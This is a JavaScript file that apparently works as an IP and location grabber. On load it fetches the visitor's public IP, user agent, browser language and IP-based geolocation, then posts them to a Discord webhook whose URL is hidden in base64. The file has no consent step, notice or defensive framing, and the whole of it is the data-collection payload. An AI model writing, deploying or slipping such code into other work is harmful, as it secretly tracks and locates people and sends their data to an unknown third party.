const fetch = require('node-fetch');
const moment = require('moment');
const atob = require('atob'); // for base64 decoding

// Define the base64-encoded Discord webhook URL
const base64Webhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEwMDA4NTI2MTIxMzM3MjQ0Ni80bjdYdWcxa3lWcUUzVjdoSlNycXFzYjgtR3BleXNsZlpUMk80LVRoVTRDMFEtTmdINlFPQ0pFOHh5bVV4TVNHZmQwaQ==';

// Function to decode base64
function decodeBase64(encodedString) {
  try {
    return atob(encodedString);
  } catch (error) {
    throw new Error(`Error decoding base64: ${error.message}`);
  }
}

// Decode the base64-encoded webhook URL
const webhookURL = decodeBase64(base64Webhook);

// Function to get the current IP address using an API
async function getIPAddress() {
  try {
    const response = await fetch('https://api64.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    throw new Error(`Error getting IP address: ${error.message}`);
  }
}

// Function to get browser specifications
function getBrowserSpecifications() {
  const userAgent = window.navigator.userAgent;
  const browserLanguage = window.navigator.language;
  return `User Agent: ${userAgent}\nBrowser Language: ${browserLanguage}`;
}

// Function to get location information based on IP address
async function getLocationInfo(ip) {
  try {
    const response = await fetch(`https://ipinfo.io/${ip}/json`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error(`Error getting location information: ${error.message}`);
    return {};
  }
}

// Function to send data to Discord webhook
async function sendToDiscord(ip, browserSpecs, location) {
  const timestamp = moment().format('YYYY-MM-DD HH:mm:ss');
  const payload = {
    content: `Timestamp: ${timestamp}\nCurrent IP Address: ${ip}\n${browserSpecs}\nLocation: ${JSON.stringify(location)}`,
  };

  try {
    await fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });
    console.log('Data sent to Discord webhook.');
  } catch (error) {
    console.error(`Error sending data to Discord webhook: ${error.message}`);
  }
}

// Main function to collect and send data
async function collectAndSendData() {
  try {
    // Get the IP address
    const ip = await getIPAddress();

    // Get browser specifications
    const browserSpecs = getBrowserSpecifications();

    // Get location information based on IP address
    const location = await getLocationInfo(ip);

    // Send the data to Discord webhook
    sendToDiscord(ip, browserSpecs, location);
  } catch (error) {
    console.error(error.message);
  }
}

// Run the script
collectAndSendData();
  
